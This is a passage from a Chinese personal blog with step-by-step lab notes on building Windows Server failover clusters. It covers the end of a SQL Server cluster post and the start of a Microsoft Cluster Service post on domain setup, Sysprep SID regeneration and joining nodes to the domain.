<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127114425542.png" class="" title="image-20241127114425542">
<p>产品密钥<code>HMWJ3-KY3J2-NMVD7-KG4JR-X2G8G</code></p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127113009454.png" class="" title="image-20241127113009454">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127202716946.png" class="" title="image-20241127202716946">
<p>勾选自己所需要的功能(没必要全部勾选) 这里我就勾选了必备功能(后期还可以在自行添加)</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127202829193.png" class="" title="image-20241127202829193">
<p>点击【下一步】</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127204455309.png" class="" title="image-20241127204455309">
<p>添加进虚拟机的cd驱动器里</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127210851715.png" class="" title="image-20241127210851715">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127210949542.png" class="" title="image-20241127210949542">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128060901585.png" class="" title="image-20241128060901585">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127211608435.png" class="" title="image-20241127211608435">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127214801612.png" class="" title="image-20241127214801612">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128055636520.png" class="" title="image-20241128055636520">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128060204872.png" class="" title="image-20241128060204872">
<p>这里的ip地址同样需要填写一个未被分配的ip地址，<code>192.168.80.35</code>，需要输入之前加入域的账号和密码</p>
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128061043800.png" class="" title="image-20241128061043800">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001803466.png" class="" title="image-20241128001803466">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001911401.png" class="" title="image-20241128001911401">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128001941449.png" class="" title="image-20241128001941449">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128003915049.png" class="" title="image-20241128003915049">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128004103519.png" class="" title="image-20241128004103519">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128004946141.png" class="" title="image-20241128004946141">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241128011921550.png" class="" title="image-20241128011921550">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241129034004415.png" class="" title="image-20241129034004415">
<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241129034113133.png" class="" title="image-20241129034113133">
<h3 id="（七）测试故障转移"><a href="#（七）测试故障转移" class="headerlink" title="（七）测试故障转移"></a>（七）测试故障转移</h3><ol>
<li><strong>测试场景</strong>：<ul>
<li>关闭 NodeA 或断开网络，观察服务是否自动切换到 NodeB。</li>
<li>停止 SQL Server 服务，观察是否影响故障转移。</li>
</ul>
</li>
<li><strong>预期结果</strong>：<ul>
<li>服务能够在节点间正常切换。</li>
<li>SQL Server 故障不会影响整体群集运行。</li>
</ul>
</li>
</ol>
<h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><ol>
<li>实验通过搭建故障转移群集，验证了其高可用性和容错性。</li>
<li>通过配置 ISCSI 存储服务器和共享磁盘，深入理解了存储资源在群集中的作用。</li>
<li>通过实验进一步掌握了 SQL Server 故障转移群集的安装与配置技巧。</li>
<li>实验中需重点关注：<ul>
<li>网络连接和服务器配置的准确性。</li>
<li>依赖服务和权限的正确性。</li>
</ul>
</li>
<li>故障转移群集的搭建对提高系统稳定性和可靠性具有重要意义。</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="moyuan">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Moyuan"s website">
      <meta itemprop="description" content="prograing or coffee">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | Moyuan"s website">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/" class="post-title-link" itemprop="url">Microsoft 群集服务（MSCS）环境的搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-21 14:33:20" itemprop="dateCreated datePublished" datetime="2024-11-21T14:33:20+08:00">2024-11-21</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-12-03 08:43:04" itemprop="dateModified" datetime="2024-12-03T08:43:04+08:00">2024-12-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Microsoft-群集服务（MSCS）环境的搭建"><a href="#Microsoft-群集服务（MSCS）环境的搭建" class="headerlink" title="Microsoft 群集服务（MSCS）环境的搭建"></a><strong>Microsoft 群集服务（MSCS）环境的搭建</strong></h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a><strong>实验目的</strong></h2><p> 利用 Windows Server 构建群集环境，具体包括： </p>
<ul>
<li>创建三个虚拟机环境 </li>
<li>部署群集环境 </li>
<li>配置共享磁盘系统 </li>
</ul>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a><strong>实验环境</strong></h2><ul>
<li><strong>操作系统</strong>： Windows Server 2019 </li>
<li><strong>工具</strong>： FreeNAS </li>
<li><p><strong>网络配置</strong>：</p>
<ul>
<li><p><strong>Node A</strong>：</p>
<ul>
<li>Public IP：<code>192.168.80.10</code> </li>
<li>Private IP：<code>10.1.1.2</code> </li>
<li>群集 IP：<code>192.168.80.15</code> </li>
</ul>
</li>
<li><p><strong>Node B</strong>：</p>
<ul>
<li>Public IP：<code>192.168.80.11</code> </li>
<li>Private IP：<code>10.1.1.3</code> </li>
<li>群集 IP：<code>192.168.80.15</code> </li>
</ul>
</li>
<li><p><strong>Windows 2019</strong>：</p>
<ul>
<li>Public IP：<code>192.168.80.6</code> </li>
</ul>
</li>
<li><p><strong>NAS</strong>：</p>
<ul>
<li>Public IP：<code>192.168.80.8</code> </li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>注意</strong>： Windows Server 2019 需创建三个独立的虚拟机，避免使用克隆方式，以防止域的 SID 冲突导致无法完成域加入。 </p>
<blockquote>
<h3 id="修改-SID-的方法"><a href="#修改-SID-的方法" class="headerlink" title="修改 SID 的方法"></a>修改 SID 的方法</h3><p>在避免克隆 SID 冲突的情况下，推荐使用内置的 <code>Sysprep</code> 工具来生成新的 SID，而不是手动修改。以下是具体操作步骤：</p>
<hr>
<h3 id="使用-Sysprep-修改-SID"><a href="#使用-Sysprep-修改-SID" class="headerlink" title="使用 Sysprep 修改 SID"></a><strong>使用 Sysprep 修改 SID</strong></h3><ol>
<li><p><strong>进入系统准备状态：</strong></p>
<ul>
<li><p>登录到需要处理的虚拟机。</p>
</li>
<li><p>打开命令提示符（管理员权限）。</p>
</li>
<li><p>运行以下命令来启动 Sysprep 工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Sysprep\sysprep.exe</span><br></pre></td></tr></table></figure>
</li>
<li><p>或直接导航到 <code>C:\Windows\System32\Sysprep</code> 并双击 <code>sysprep.exe</code>。</p>
</li>
</ul>
</li>
<li><p><strong>配置 Sysprep：</strong></p>
<ul>
<li>在 Sysprep 界面中：<ul>
<li>选择 <strong>“进入系统全新体验（OOBE）”</strong> 模式。</li>
<li>勾选 <strong>“通用化（Generalize）”</strong> 选项。</li>
<li>在操作下拉框中选择 <strong>“关机”</strong> 或 <strong>“重新启动”</strong>（根据需求）。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>运行 Sysprep：</strong></p>
<ul>
<li>点击 <strong>确定</strong>，系统会进入处理状态。</li>
<li>Sysprep 会移除系统的现有 SID 并为其准备新的。</li>
</ul>
</li>
<li><p><strong>完成后启动：</strong></p>
<ul>
<li>系统完成 Sysprep 后会自动关机或重启。</li>
<li>启动后，系统会进入 OOBE（全新体验模式），需要重新配置计算机名称和一些基础设置。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="验证新的-SID"><a href="#验证新的-SID" class="headerlink" title="验证新的 SID"></a><strong>验证新的 SID</strong></h3><p>完成 Sysprep 后，你可以通过以下步骤验证 SID 是否已经更改：</p>
<ol>
<li><p>打开命令提示符，输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
</li>
<li><p>检查输出的 SID 是否与之前的不同。如果 SID 已变化，说明操作成功。</p>
</li>
</ol>
</blockquote>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119101901179-1733186553290-1.png" class="" title="image-20241119101901179">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135115969-1733186553292-4.png" class="" title="image-20241119135115969">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119135130989-1733186553291-2.png" class="" title="image-20241119135130989">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119141652609-1733186553292-3.png" class="" title="image-20241119141652609">
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h2><h3 id="1-创建域服务器"><a href="#1-创建域服务器" class="headerlink" title="1. 创建域服务器"></a>1. <strong>创建域服务器</strong></h3><ol>
<li><p><strong>配置 Master 节点</strong>：</p>
<ul>
<li>将 Master 节点设置为域控制器，关闭防火墙，配置 IP 地址和子网掩码。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090522634-1733186553292-5.png" class="" title="image-20241119090522634"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119144201106-1733186553292-6.png" class="" title="image-20241119144201106"></li>
<li>测试 Master 与 Node A 的连通性，确保网络通信正常。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119090656263-1733186553292-7.png" class="" title="image-20241119090656263"></li>
</ul>
</li>
<li><p><strong>安装 Active Directory 域服务</strong>：</p>
<ul>
<li>打开“服务器管理器”，选择“添加角色和功能”。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091008961-1733186553292-8.png" class="" title="image-20241119091008961"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091038796-1733186553292-9.png" class="" title="image-20241119091038796"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091231831-1733186553292-10.png" class="" title="image-20241119091231831"></li>
<li>在“服务器角色”中，选择“Active Directory 域服务”，并继续安装。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091514916-1733186553293-11.png" class="" title="image-20241119091514916"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091636710-1733186553293-12.png" class="" title="image-20241119091636710"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119091715409-1733186553293-13.png" class="" title="image-20241119091715409"></li>
<li>安装完成后，点击“将此服务器提升为域控制器”。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092647158-1733186553293-14.png" class="" title="image-20241119092647158"></li>
<li>在“部署配置”中，选择“添加新林”，并设置根域名为 <code>ha.com</code>。</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119092748526-1733186553293-15.png" class="" title="image-20241119092748526"> </li>
<li>在“域控制器选项”中，设置目录服务还原模式 (DSRM) 密码（如：<code>Aa123456?</code>）。 </li>
<li>在“DNS 选项”和“其他选项”中，使用系统默认设置。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093020997-1733186553293-16.png" class="" title="image-20241119093020997"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093334122-1733186553293-17.png" class="" title="image-20241119093334122"></li>
<li>进入管理员账户（控制面板），对账户设置密码，创建Administrator账户的密码为Aa123456?</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093653025-1733186553293-18.png" class="" title="image-20241119093653025"></li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093751310-1733186553293-19.png" class="" title="image-20241119093751310"></li>
<li>在“先决条件检查”中，确保所有检查通过，然后点击“安装”。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119093856742-1733186553293-20.png" class="" title="image-20241119093856742"></li>
<li>安装完成后，服务器将自动重启，完成域控制器的配置。 </li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095248275-1733186553293-21.png" class="" title="image-20241119095248275"></li>
<li>重新配置密码Aa123456?</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095502452-1733186553294-22.png" class="" title="image-20241119095502452">
</li>
</ul>
</li>
</ol>
<h3 id="2-将群集节点加入域"><a href="#2-将群集节点加入域" class="headerlink" title="2. 将群集节点加入域"></a>2. <strong>将群集节点加入域</strong></h3><ol>
<li><p><strong>配置 Node A 节点</strong>：</p>
<ul>
<li><p>打开“服务器管理器”，选择“添加角色和功能”，安装 DNS 服务器角色。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094113885-1733186553294-23.png" class="" title="image-20241119094113885">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119094155042-1733186553294-24.png" class="" title="image-20241119094155042">
</li>
<li><p>安装完成后，重启服务器。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119095749416-1733186553294-25.png" class="" title="image-20241119095749416">
</li>
<li><p>右键“此电脑”，选择“属性”，点击“更改设置”，在“计算机名”选项卡中，点击“更改”。 </p>
</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119100200384-1733186553294-26.png" class="" title="image-20241119100200384">
</li>
<li><p>将计算机名称设置为 <code>Node A</code>，并选择“域”，输入 <code>ha.com</code>，点击“确定”。 </p>
</li>
<li><p>系统提示输入具有加入域权限的账户信息，输入域管理员账户（如：<code>Administrator</code>）和密码（如：<code>Aa123456?</code>）。 </p>
</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163241979-1733186553294-27.png" class="" title="image-20241119163241979">
</li>
<li><p>成功加入域后，系统提示重启，点击“确定”并重启服务器。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163322292-1733186553294-28.png" class="" title="image-20241119163322292">
</li>
</ul>
</li>
<li><p><strong>配置 Node B 节点</strong>：</p>
<ul>
<li><p>按照与 Node A 相同的步骤进行配置，确保成功加入 <code>ha.com</code> 域。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163825095-1733186553294-29.png" class="" title="image-20241119163825095">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119163849667-1733186553294-30.png" class="" title="image-20241119163849667">
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241119164004968-1733186553294-31.png" class="" title="image-20241119164004968">
</li>
</ul>
</li>
</ol>
<h3 id="3-创建群集域账号"><a href="#3-创建群集域账号" class="headerlink" title="3. 创建群集域账号"></a>3. <strong>创建群集域账号</strong></h3><ol>
<li><p><strong>登录 Master 节点</strong>：</p>
<ul>
<li>使用域管理员账户登录 Master 节点。 </li>
<li>打开“服务器管理器”，点击“工具”，选择“Active Directory 用户和计算机”。 </li>
</ul>
</li>
<li><p><strong>创建新用户</strong>：</p>
<ul>
<li><p>在左侧的目录树中，右键点击“Users”容器，选择“新建”&gt;“用户”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001700522-1733186553294-32.png" class="" title="image-20241120001700522">
</li>
<li><p>在“新建对象 - 用户”窗口中，输入用户的“姓名”、“用户登录名”（如：<code>moyu</code>），点击“下一步”。 </p>
</li>
<li><img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001856348-1733186553294-34.png" class="" title="image-20241120001856348">
</li>
<li><p>设置用户密码（如：<code>Aa123456?</code>），取消勾选“用户下次登录时须更改密码”，确保勾选“用户不能更改密码”和“密码永不过期”，然后点击“下一步”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120001952140-1733186553294-33.png" class="" title="image-20241120001952140">
</li>
<li><p>确认信息无误后，点击“完成”创建用户。 </p>
</li>
</ul>
</li>
</ol>
<h3 id="4-配置群集服务"><a href="#4-配置群集服务" class="headerlink" title="4. 配置群集服务"></a>4. <strong>配置群集服务</strong></h3><ol>
<li><p><strong>在 Node A （使用管理员身份进行登录，使用普通用户进行登录，会出现权限不够的问题，导致实验无法成功）上安装故障转移群集功能</strong>：</p>
<ul>
<li><p>打开“服务器管理器”，选择“添加角色和功能”。 </p>
<img src="/2024/11/21/Microsoft%20%E7%BE%A4%E9%9B%86%E6%9C%8D%E5%8A%A1%EF%BC%88MSCS%EF%BC%89%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA/image-20241120002243852-1733186553294-35.png" class="" title="image-20241120002243852">
</li>
<li><p>在“功能”页面，勾选“故障转移群集”，点击“下一步”，然后点击“安装”。 </p>
</li>
